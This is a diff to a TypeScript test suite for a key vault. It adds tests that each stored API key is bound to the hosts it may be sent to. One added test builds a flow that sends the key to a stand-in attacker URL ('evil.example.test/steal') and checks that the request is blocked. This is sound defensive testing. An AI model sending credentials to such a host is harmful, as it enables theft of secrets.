@@ -250,8 +250,17 @@ describe("the key vault", () => {
     expect((await api(editor, "PUT", `/api/workspaces/${ws}/keys/EXAMPLE_API_KEY`, { value: SECRET })).status).toBe(403);
     expect((await api(admin, "PUT", `/api/workspaces/${ws}/keys/lowercase`, { value: SECRET })).status).toBe(400);
     expect((await api(admin, "PUT", `/api/workspaces/${ws}/keys/FLOWGIT_HOME`, { value: SECRET })).status).toBe(400);
-    const stored = await ok<{ key: { name: string; last4: string } }>(api(admin, "PUT", `/api/workspaces/${ws}/keys/EXAMPLE_API_KEY`, { value: SECRET }));
-    expect(stored.key).toEqual({ name: "EXAMPLE_API_KEY", last4: "CRET" });
+    // A key no preset knows must say where it may be sent.
+    expect((await api(admin, "PUT", `/api/workspaces/${ws}/keys/EXAMPLE_API_KEY`, { value: SECRET })).status).toBe(400);
+    expect((await api(admin, "PUT", `/api/workspaces/${ws}/keys/EXAMPLE_API_KEY`, { value: SECRET, hosts: ["http://x"] })).status).toBe(400);
+    const stored = await ok<{ key: { name: string; last4: string; hosts: string[] } }>(
+      api(admin, "PUT", `/api/workspaces/${ws}/keys/EXAMPLE_API_KEY`, { value: SECRET, hosts: ["api.example.test"] }),
+    );
+    expect(stored.key).toEqual({ name: "EXAMPLE_API_KEY", last4: "CRET", hosts: ["api.example.test"] });
+    // A preset's key goes to the preset's own host by default.
+    const deepseek = await ok<{ key: { hosts: string[] } }>(api(admin, "PUT", `/api/workspaces/${ws}/keys/DEEPSEEK_API_KEY`, { value: "sk-deepseek-test-value" }));
+    expect(deepseek.key.hosts).toEqual(["api.deepseek.com"]);
+    await ok(api(admin, "DELETE", `/api/workspaces/${ws}/keys/DEEPSEEK_API_KEY`));
     const listed = await api(editor, "GET", `/api/workspaces/${ws}/keys`);
     const listedText = await listed.text();
     expect(listedText).toContain("EXAMPLE_API_KEY");
@@ -278,6 +287,17 @@ describe("the key vault", () => {
 
     // No key anywhere: files in R2, run.json, logs, the socket, D1.
     await expectNoSecret(SECRET, flow, socket.frames);
+
+    // A flow that sends the key anywhere else is stopped before the request leaves.
+    seen.length = 0;
+    const stolen = await newFlow(editor, ws, keyFlow("https://evil.example.test/steal"));
+    const refused = await api(editor, "POST", `/api/flows/${stolen}/board/run`, { stage: "call" });
+    expect(refused.ok).toBe(false);
+    expect(JSON.stringify(await refused.json())).toContain("api.example.test");
+    expect(seen).toEqual([]);
+    const usesAfter = await ok<{ uses: { flow_id: string }[] }>(api(admin, "GET", `/api/workspaces/${ws}/key-uses`));
+    expect(usesAfter.uses.map((use) => use.flow_id)).toEqual([flow]);
+    await expectNoSecret(SECRET, stolen, []);
 
     // Deleted: the next run can't use it, at once.
     await ok(api(admin, "DELETE", `/api/workspaces/${ws}/keys/EXAMPLE_API_KEY`));
